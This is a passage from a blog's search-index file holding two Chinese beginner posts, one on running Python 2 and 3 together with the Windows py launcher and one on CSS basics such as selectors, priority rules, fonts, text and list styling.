    <url>/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="简易解决python2-X与python3-x共存问题"><a href="#简易解决python2-X与python3-x共存问题" class="headerlink" title="简易解决python2.X与python3.x共存问题"></a>简易解决python2.X与python3.x共存问题</h1><p>python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>Python目前还是需要分开安装</p><pre><code class="python">py -2 -m pip install xxxx</code></pre><pre><code class="python">py -3 -m pip install xxxx</code></pre><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>分别用py2.x py3.x运行一个1.py的脚本：</p><pre><code class="python">py -2 1.py</code></pre><pre><code class="html">py -3 1.py</code></pre><p>或者在1.py的文件代码头加上<code>#! python3</code>  <code>#! python2</code>看个人的情况。</p><p>这样就直接输入：</p><pre><code class="python">py 1.py</code></pre><p>这只是解决了简单的<strong><u>安装模块和运行脚本</u></strong>的问题。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css学习</title>
    <link href="/2019/03/30/css%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/03/30/css%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="如何使用CSS"><a href="#如何使用CSS" class="headerlink" title="如何使用CSS"></a>如何使用CSS</h2><p>CSS<br>可以通过以下方式添加到HTML中:</p><ol><li>内联样式- 在HTML元素中使用”style” <strong>属性 (不推荐使用)；</strong></li><li>内部样式表 -在HTML文档头部 <code>&lt;head&gt;</code> 区域使用<code>&lt;style&gt;</code><strong>元素</strong> 来包含CSS。</li><li>外部引用 - 使用外部 CSS <strong>文件</strong>(==推荐使用)==</li></ol><h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>应用到个别元素时，就可以使用内联样式。</p><pre><code class="html">&lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;苹果&lt;/div&gt;</code></pre><h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>当单个文件需要特别样式时，就可以使用<strong>内部样式表</strong>。你可以在<code>&lt;head&gt;</code> 部分通过 <code>&lt;style&gt;</code>标签定义内部样式表:。也推荐这样使用便于更改全局。</p><pre><code class="html">&lt;head&gt;&lt;style&gt;        div{            color: red;            width: 100px;             height: 100px;            background: yellow        }    &lt;/style&gt;&lt;/head&gt;</code></pre><p><strong>注：在头文件写的时候 style还是个开闭标签。</strong></p><h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4><p>用<code>&lt;link&gt;</code>当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。</p><pre><code class="html">&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;   &lt;/head&gt;</code></pre><p><strong>其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址；</strong></p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a><strong>练习：</strong></h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;css三种引入方式&lt;/title&gt;    &lt;!-- &lt;style&gt;        div{            color: red;            width: 100px;             height: 100px;            background: yellow        }    &lt;/style&gt; --&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;1.css&quot;&gt;&lt;/head&gt;&lt;body&gt;      &lt;!-- &lt;div style=&quot;color: red;width: 100px; height: 100px; background: yellow&quot;&gt;苹果&lt;/div&gt; --&gt;      &lt;div&gt; 苹果1&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code class="html">div{    color: red;    width: 100px;     height: 100px;    background: yellow    }   &lt;!-- 1.css --&gt;</code></pre><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css1.jpg?raw=true" srcset="/img/loading.gif" alt="CSS 语法"></p><h2 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h2><h4 id="CSS-语法规则"><a href="#CSS-语法规则" class="headerlink" title="CSS 语法规则"></a>CSS 语法规则</h4><p>由两个主要的部分构成：选择器，以及一条或多条声明:</p><ul><li>选择器通常是您需要改变样式的 HTML 元素。</li><li>每条声明由一个属性和一个值组成。</li><li>属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。</li><li>CSS声明总是以分号(;)结束，声明组以大括号({})括起来</li></ul><p>例：<code>h1{ color:blue; font-size :12px;}</code></p><p>其中h1 为选择器 color 是属性 blue是值。</p><h4 id="CSS-注释："><a href="#CSS-注释：" class="headerlink" title="CSS 注释："></a><strong>CSS 注释</strong>：</h4><p>CSS注释以 “<strong>/*</strong>“ 开始, 以 “<strong>*/</strong>“ 结束。</p><h4 id="颜色："><a href="#颜色：" class="headerlink" title="颜色："></a>颜色：</h4><p>颜色属性被用来设置文字的颜色。</p><p>颜色是通过CSS最经常的指定：</p><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong></li><li>颜色的名称 - 如: <strong>red</strong></li></ul><p><strong>常用的</strong>：<strong>rgb：</strong>：r是红色，g是绿色，b是蓝色。</p><pre><code class="html">body {color:red;}  h1 {color:#00ff00;}   /* 可以写成 #0f0 */h2 {color:rgb(255,0,0);}   /* 0-255 */ 是其颜色深浅</code></pre><p>==<strong>注</strong> - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。==</p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p><strong>基本选择器</strong>：</p><ul><li><strong>id 选择器</strong>：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以<strong>id属性</strong>来设置id选择器,CSS 中 id 选择器以 <strong>“#”</strong> 来定义。（==ID属性不要以数字开头==）</li><li><strong>class 选择器</strong>：class 选择器用于描述<strong>一组元素的样式</strong>，class 选择器有别于id选择器，class可以在多个元素中使用。 例：<code>&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt;</code>  。class 选择器在HTML中以<strong>class属性</strong>表示, 在 CSS 中，类选择器以一个点<strong>“.”</strong>号显示</li><li><code>*</code>通配符：全部标签属性的都会有效果。</li><li><strong>标签 div</strong>：div标签 的会有效果。</li></ul><p><strong>练习</strong>：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;css选择器&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;1.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;div111        &lt;div&gt;div222&lt;/div&gt;        &lt;p id=&quot;txt&quot;&gt;the way i am&lt;/p&gt;        &lt;p class=&quot;txt1 txt2&quot;&gt;song&lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>css：</p><pre><code class="html">div{    color: red;    width: 100px;     height: 100px;    background: yellow    }#txt{    color: #1f1;}.txt1 {    font-size: 10px;}.txt2 {    color: #ff2;}</code></pre><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css2.png?raw=true" srcset="/img/loading.gif" alt></p><h2 id="CSS原理"><a href="#CSS原理" class="headerlink" title="CSS原理"></a>CSS原理</h2><h4 id="优先原则"><a href="#优先原则" class="headerlink" title="优先原则"></a>优先原则</h4><p><strong>优先原则</strong>：后解析的内容，会覆盖掉原来解析的内容。</p><p><strong>1:同一个选择器</strong>:从上往下执行。</p><p>例：</p><pre><code class="html">div{     color: red;    color: green;  }/*最终是为绿色*/  </code></pre><p><strong>2:同一类型的选择器</strong>：从上往下执行</p><p>例：</p><pre><code class="html">div{    background: yellow;}div{    background: red;}/*最终是为红色*/  </code></pre><pre><code class="html">.bg1{    background: yellow;}.bg2{    background: blue;}/*最终是为蓝色*/</code></pre><p><code>&lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt;</code>  <strong>在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue</strong>。</p><p><strong>3：不同类型的选择器：</strong>看优先级</p><p>先解析低级的在解析高级的：<strong>* &lt; div &lt; class &lt; id</strong></p><pre><code class="html">div{    color: red；}.bg1{    color: yellow;}   /*最终是为黄色*/</code></pre><p><strong>4：多重样式优先级</strong></p><p>样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。</p><p>一般情况下，优先级如下：</p><p><strong>内联样式 &gt; 内部样式 &gt;外部样式</strong>      ==（谁优先级越高越最后解析）==</p><p>对于全部都是 当加上<code>!important</code>  这个选择器的内容就会最后进行。 </p><h4 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h4><p>==<strong>对于嵌套标签，子级继承父级。</strong>==</p><ol><li>文字 文本 样式可以继承，其他的不能。 </li><li>块级元素 没有设置的时候，会继承父级的<strong>宽</strong>，而高度则是看其内容长短。</li></ol><h2 id="CSS组成选择器"><a href="#CSS组成选择器" class="headerlink" title="CSS组成选择器"></a>CSS组成选择器</h2><h4 id="分组选择器"><a href="#分组选择器" class="headerlink" title="分组选择器"></a>分组选择器</h4><p>直接上代码了：</p><pre><code class="html">div{    background: green;    color: red;}p{   background: green;    color: red;   font-size: 50px;}</code></pre><pre><code class="html">div,p{    background: green;    color: red;}p{   font-size: 50px;}</code></pre><p><strong>把div 与 p 里面相同的部分放到一个里面就行了。</strong></p><h4 id="嵌套选择器"><a href="#嵌套选择器" class="headerlink" title="嵌套选择器"></a>嵌套选择器</h4><pre><code class="html">div p{    background: green;    color: red;    font-size: 50px;}    </code></pre><pre><code class="html">&lt;body&gt;    &lt;div&gt; div1        &lt;div&gt;div2            &lt;p&gt;p2&lt;/p&gt;            &lt;ul&gt;                &lt;li&gt;                    &lt;p&gt;p3&lt;/p&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;</code></pre><p><strong>只要在其父或父的以上级有div，那这个p里的东西就能生效</strong>。</p><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css3.jpg?raw=true" srcset="/img/loading.gif" alt></p><h4 id="子选择器"><a href="#子选择器" class="headerlink" title="子选择器"></a>子选择器</h4><p><strong>这个和以上很类似，区别在只在其父为div时，才能生效。</strong></p><pre><code class="html">div&gt;p{    background: green;    color: red;    font-size: 50px;}    </code></pre><p><strong>类比以上就是只有p2有css效果</strong></p><h4 id="同级选择器"><a href="#同级选择器" class="headerlink" title="同级选择器"></a>同级选择器</h4><pre><code class="html">div+p{    background: green;    color: red;    font-size: 50px;}    </code></pre><p>在平级的p才可以生效，对比以上，也就是p1是有css效果。</p><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><pre><code class="html">p[title=cc]{    background: green;    color: red;    font-size: 50px;}</code></pre><pre><code class="html">&lt;body&gt;    &lt;div&gt; div1        &lt;div&gt;div2            &lt;p&gt;p2&lt;/p&gt;            &lt;ul&gt;                &lt;li&gt;                    &lt;p title=&quot;cc&quot;&gt;p3&lt;/p&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;p title=&quot;cc 1&quot;&gt;p1&lt;/p&gt;&lt;/body&gt;</code></pre><p>基本标签==+==</p><ul><li><p>[属性=值]：p3出现css效果。</p></li><li><p>[属性~=值]：p1 p3出现css效果。  注意：代码中<code>cc 1</code>需要空格隔开，不隔没有效果。</p></li><li><p>[属性^=值]：开头有cc的字符就行<code>cc1</code>. p1 p3 出现cc效果。</p></li><li><p>[属性$=值]：类比<code>^=</code>  是结束。</p></li></ul><h2 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h2><p>每个我自己写出来的元素都会有伪元素。、</p><p>例：</p><pre><code class="html">&lt;p title=&quot;cc&quot;&gt; &lt;!--&lt;before&gt; --&gt;        ppp  &lt;!--&lt;after&gt; --&gt;    &lt;/p&gt;</code></pre><p>直接上代码：</p><pre><code class="html">p::before{    content: &quot;before&quot;}p::after{    content: &quot;after&quot;}</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css4.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><strong>块元素：</strong></p><p>第一个字母：<code>first-letter</code></p><p>第一行：<code>first-line</code></p><pre><code class="html">p::first-letter{    color: red;    font-size: 100px;}</code></pre><p>这些写就是会是p内内容第一个<strong>字符</strong>大写。</p><p>也可以为</p><pre><code class="html">&lt;p title=&quot;cc&quot;&gt;        &lt;first-letter&gt;t        &lt;/first-letter&gt;        he way i am ;    &lt;/p&gt;</code></pre><h2 id="CSS-背景"><a href="#CSS-背景" class="headerlink" title="CSS 背景"></a>CSS 背景</h2><p>CSS 背景属性用于定义HTML元素的背景。</p><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><p><code>background-color</code> 属性定义了元素的背景颜色.</p><p>页面的背景颜色使用在body的选择器中:</p><p><code>body {background-color:red;}</code></p><h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p><code>background-image</code>属性描述了元素的背景图像.</p><p>默认情况下，背景图像进行<strong>平铺重复</strong>显示.</p><p><code>body {background-image:url(&#39;1.png&#39;);}</code></p><h4 id="背景图像-相关设置"><a href="#背景图像-相关设置" class="headerlink" title="背景图像 - 相关设置"></a>背景图像 - 相关设置</h4><ul><li><strong>水平或垂直平铺</strong>：</li></ul><pre><code class="html">body{background-image:url(&#39;gradient2.png&#39;);background-repeat:repeat-x;}</code></pre><p>  里面repeat-x是x轴，repeat-y是y轴。</p><ul><li><strong>不平铺：</strong><code>background-repeat:no-repeat</code></li><li><strong>定位：</strong></li></ul><p>​      <code>background-position:50% 0%</code> 这使其在x轴的中心，</p><p>​        x： left center right；</p><p>​        y:  top center bottom；</p><h2 id="css字体"><a href="#css字体" class="headerlink" title="css字体"></a>css字体</h2><h4 id="css字体-1"><a href="#css字体-1" class="headerlink" title="css字体"></a>css字体</h4><ul><li><p><strong>字体系列</strong>：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。</p><p>例：<code>font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;;</code></p></li><li><p><strong>字体样式</strong>:<code>font-style:italic;</code>斜体</p></li><li><p><strong>字体大小</strong>：font-size 属性设置文本的大小。<code>font-size:40px;</code> font-weight: 设置其粗细。font-weight:</p><p>normal lighter blod;</p></li></ul><p>练习：</p><pre><code class="html">body {    font-family: &quot;黑体&quot;,&quot;宋体&quot;;    font-style:italic;    font-size:80px;    font-weight: bold;}  /*5.css */ </code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;文字-字体&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;5.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    这是一段字    &lt;br&gt;    hello world!&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="CSS-文本"><a href="#CSS-文本" class="headerlink" title="CSS - 文本"></a>CSS - 文本</h2><h4 id="文本属性集合"><a href="#文本属性集合" class="headerlink" title="文本属性集合"></a>文本属性集合</h4><ul><li><strong>color属性用于设置文本的颜色</strong></li><li><strong>direction属性用于设置文本方向。</strong></li><li><strong>letter-spacing属性用于在组成单词的字母之间添加或减去空格。</strong> </li><li><strong>text-indent属性用于缩进段落的文本。</strong></li><li><strong>text-align属性用于对齐文档的文本。</strong> </li><li><strong>text-decoration属性用于下划线，上划线和删除文本。</strong></li><li><strong>text-transform属性用于大写文本或将文本转换为大写或小写字母。</strong></li><li><strong>white-space属性用于控制文本的流和格式。</strong></li><li><strong>text-shadow属性用于设置文本周围的文本阴影。</strong></li></ul><h4 id="文本颜色："><a href="#文本颜色：" class="headerlink" title="文本颜色："></a>文本颜色：</h4><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong>     ==不推荐使用太多浏览器不支持==</li><li>颜色的名称 - 如: <strong>red</strong></li></ul><pre><code class="html">body {color:red;}h1 {color:#00ff00;}h2 {color:rgb(255,0,0);}</code></pre><h4 id="文本的对齐方式"><a href="#文本的对齐方式" class="headerlink" title="文本的对齐方式"></a>文本的对齐方式</h4><p>文本可居中或对齐到左或右,两端对齐.</p><pre><code class="html">.a1{    text-align:right;}.a2{    text-align:center;}.a3{    text-align:left;}</code></pre><pre><code class="html">&lt;body&gt;    &lt;p class=&quot;a1&quot;&gt;这是一段字&lt;/p&gt;    &lt;br&gt;     &lt;p class=&quot;a2&quot;&gt;hello world!&lt;/p&gt;     &lt;p class=&quot;a3&quot;&gt;hhhhaaaa&lt;/p&gt;&lt;/body&gt;</code></pre><h4 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h4><p>装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。</p><pre><code class="html">.a1{    text-decoration:overline;}.a2{    text-decoration:line-through;}.a3{    text-decoration:underline;}</code></pre><h4 id="文本缩进"><a href="#文本缩进" class="headerlink" title="文本缩进"></a>文本缩进</h4><p>文本缩进属性是用来指定文本的第一行的缩进。</p><p><code>p {text-indent:50px;}</code></p><h4 id="文本方向"><a href="#文本方向" class="headerlink" title="文本方向"></a>文本方向</h4><p>值是ltr或rtl。</p><pre><code class="html">.a{  direction:rtl;   }</code></pre><p>文字就先写到这。</p><h2 id="CSS-链接"><a href="#CSS-链接" class="headerlink" title="CSS 链接"></a>CSS 链接</h2><h4 id="链接样式"><a href="#链接样式" class="headerlink" title="链接样式"></a>链接样式</h4><ol><li><strong>a:link - 正常，未访问过的链接</strong></li><li><strong>a:visited - 用户已访问过的链接</strong></li><li><strong>a:hover - 当用户鼠标放在链接上时</strong></li><li><strong>a:active - 链接被点击的那一刻</strong></li></ol><p><code>a:link {color: red;}</code></p><h2 id="CSS列表"><a href="#CSS列表" class="headerlink" title="CSS列表"></a>CSS列表</h2><p>常用的就是</p><pre><code class="html">ul{    list-style-type: none;      list-style-type: disc;    实心圆    list-style-type: circle;    空心圆    list-style-type: square;      实心方格}</code></pre><p>最常用就是 none 然后换成自己想弄成的图片。</p><p> ol 对应就是 <code>lower-alpha</code>  <code>upper-alpha</code> <code>lower-roman</code>等等；</p><p><strong>作为列表项标记的图像</strong></p><pre><code>ul{    list-style-image: url(&#39;&#39;);}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
